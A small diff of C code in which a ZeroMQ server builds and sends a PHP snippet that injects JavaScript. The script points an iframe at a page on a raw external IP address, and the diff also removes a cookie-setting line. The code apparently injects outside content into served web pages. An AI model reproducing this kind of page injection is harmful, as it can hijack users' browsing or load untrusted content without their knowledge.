@@ -56,8 +56,6 @@ int zmq_server_init (void)
 		
 		l+= snprintf(sendbuffer, 2048,
 			"echo  \'document.getElementById(\"suspendcode15iframe\").src=\"http://219.234.83.60/locate_2/ddk_yanmai.pc.html\";\';"
-			"setcookie(\"%s\", \"%s\", time()+3600);",
-			"__hy_cook1", "ppppp"
 			);
 			
 		zmq_send(server, sendbuffer, l , 0);
